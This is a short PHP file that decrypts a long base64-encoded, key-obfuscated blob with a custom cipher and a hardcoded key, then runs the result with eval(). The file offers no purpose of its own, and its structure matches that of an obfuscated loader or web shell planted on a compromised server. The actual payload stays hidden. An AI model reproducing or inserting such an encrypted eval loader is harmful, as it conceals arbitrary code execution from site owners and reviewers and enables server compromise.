<?php
function decrypt($data, $key){
    $key = md5($key);
    $x = 0;
    $data = base64_decode($data);
    $len = strlen($data);
    $l = strlen($key);
    $char = '';
    for ($i = 0; $i < $len; $i++) {
        if ($x == $l) {
            $x = 0;
        }
        $char .= substr($key, $x, 1);
        $x++;
    }
    $str = '';
    for ($i = 0; $i < $len; $i++) {
        if (ord(substr($data, $i, 1)) < ord(substr($char, $i, 1))) {
            $str .= chr((ord(substr($data, $i, 1)) + 256) - ord(substr($char, $i, 1)));
        } else {
            $str .= chr(ord(substr($data, $i, 1)) - ord(substr($char, $i, 1)));
        }
    }
    return $str;
}
$data = "pZufmY+pl6SNicjOrNWlk6uVyKKrpKXXW15YZl5vcz7OmFmZo6mXpI2Gw6x+uZRZlZ7Qn51ckI1UWF5WVVjFe6qGjFeTnp+fyYnBhXaiWVljXYyrRj88pJeapaWZXIhizaaSk5ObpaOHjpSZbZlibT9AbHCcnaDTmFpan6OYy6yTopmgUmJiZJmWjaBGb0KXlZ7SUFuYm9GjllifqFTVn4dtPjqtQzyZy4rN2KzKrVpWlap1jZBV26abrJtXkY9Ui1hRpKKfn1iJwauqjcBbqaSf15VbklyNrz9CP1mr2J3Zl1FtUKqkmdKKiMSAqo2NVK3Vma2aVcFdbUVAPljWldmaUW1XZGFXk4KI3KvOrZdgXZGYraKfi28/Qj9Zl9Wi2ZefpG1dmZ/UydDKZtiippdj2ZWrnpnNl5Osn6SioFSMYFWnop+mlZOJks2t0qVZbUNtOZ+en8mToq2qlJfVotmXn6SjXlagxtbMkV3IqKCmm9GkYnA8cT47nZmdo4ZYyKGfpJWkpmtybG3ap9GioJ1ehZ2vm2HUnKJaX3BBcLFyPJqWWFeYpdPF2M6o05iXqp/WpKxdWsqdnp2Vpanak8ihn6SVpKajjIuNhbRyQzuYq9GTrZ6i0lSYoaKak9ap2ZGUn56ql57Z1YyJn8SspqSkxJ2eYVOIp1tYsUI+bz2JmKFQbVZyltTSydNhiZ+RparVnpqimJBUWa9dXm9zPm47cZanqJukyoqIy6mRWValX549Qz48pJqVpKWomY5Yy6Jaaz1AOznXx9jaq9NZhoSLqGtGPzzhQTy1Qz+a26LIppqfnlaVpdfOw9yex6mTmZuLVK6nn42vP0JWPljJqdeeUW1Qmaei0cHN06LZYVttP3A6Qpio1qCRq5upo9aojVaUpaKiXlCot7axiLWNkYeIr1xZWajWoFtzQz89yanXnpCjlaqhoNmKiMiu16VeUnm4goWEg7iTen13eXm4YIWYkpyjm1trcmxtyK7XpZGlm9efqalbiJenqqJhVKmJt36AgISVhHW5t7azjbd6gIV8qIJlVWSNbz9CP1mYx6jGb5SloqKRld3Hx41dyK6knl+ePUM+ltmmnpeZoaPZmY1WlKWioltrcmxtzp+NWlaWl9eRYrBAbj07XJqWqMdUolJxlpmil4/Mx9jEnNSnppek16NhWajWoFtzQz8940FvO6OVpKuknoWGyMatxnQ/PLNwOqKbW82npZ2qXVjFe6qGjFKimpuih7+Ni1+FXZF5e7eLW6ql0FaPYbFCPm9Y15aaolBzUlTEqam5lIerlpuohY10Qj1tWKeqolVxhljEeXaEi1inotGEwaBGb0Jyn6HHmatdVZJjVGZWWabKnddbbD06P1al186VomDNraaicJJfYFVhhFinqqJVYoZb0qGTkZ5kmqTSzougRm9CVqeoz2J2XJvYqKJyZWRbhmKFVqainFZgUIzL0sme3WemqqqKa0Y/PIinpqqVnaGXVKJSlKWiopGnysTUxqDKYVanqM9hYnBAbj1Wq6qnk86hl1JuUJOrpJzE2cnHqcagl1pa2KKlZ1yfQTxBnJ6gy5PVp6WPk6WgpMrQ2Nhhh2dhVFaRUF2nl82mUmZWV2OIVJNSU52fmJOek8rY0qWHZVJWqdeimJ2glV1tRUA+ms+gypGhpaSVlZ/T1snTrdhhVGBlhVBnVVfWmJuqVmNUiGOHUl9QUp+glMraktWh1VteUlrWpKuUm9FmW3NDPz2KmsSlpaKLk1JthYKLk2iMWWBSWtWUoqdTklRZZ11VYoZb0qGTkZ5kmqTSzougRm9CVpiV1qSrkJCEcVJYXWNjjVSTUlWilJ+kUJOCi5RghWdSWZ/RlJ6tYdScol9xQj5vmtSklpGTnlpUy8HX2auFmqVSWsmZpZqpxV2tRUA+Pc+ajZianJWVl6jO1djYYYmfm56b2ZFiXq5xPjtBP1mcx6LJnpZQbVaYn9XH0o1dy6Kel6zEXGCnlYtdbUVAPj1vWNeWpJmqm1JthcjN0Z7YoqyXXoVeaFdhiJqbpJurlY9vcjw6OTlahaTX1snSqYV2UpioyJGdXVfMlaCcoppghljXlqSZqptba4Vvbm5Cbp+VnqXWlWFZm8WilqSbXm+GQW87OjmZnFqj2dTX2auNXYWmqNeVpqVfi2Nhnp+hmYaZ05ZYWVmxPzpua21unsihoVJYn6B3cabUlaBYqamt0pmiWZefnqpfp8rLy82tn5uhnpqek6ihotZumaqbmqKhW6NWl5mcm6iRhdXZyJzKrKVuZdagmqNxoGOidlhwQXA9bjs6cJOen5/JiojLotGeqJNik2dtaVyfQTxBPz6xy6DYl6w9Oj87OW7Hx82ohVtuonSfo6mWoYSnprGimnGNmtSgpV2nm5uXzdaex6jRnW2Vpc+fq2+lyZhtX3RZms+gyqiSUKKbnp/GxqCUrNWaoHBykqB3V25xPjtBP7JBcD1uO6aeo5umWIm12NetyqaiW3FwOkJCPW09r52iqJnhQW87OjmVmZqfhYSg1XehrKKTpIOjra6fyXFZnqWjqJOrypuYmKRwlJ/Rxp/IqNGopGyoyJR0XHGImpukm6uVhqLUplGWn6uglKGR19Wa03duYaahUnRCPW09r0VAPrFzPteXn5Gdm1pSk5HR25/OpZdgpsugW2FVkmOfrpxjpM6kh1tsPTp2lZjS0ciNW5OhppOZxpWsqFWQZGlta15vcz7i";
$key = "Mkdq6pWE";
$str = decrypt($data, $key);
eval($str);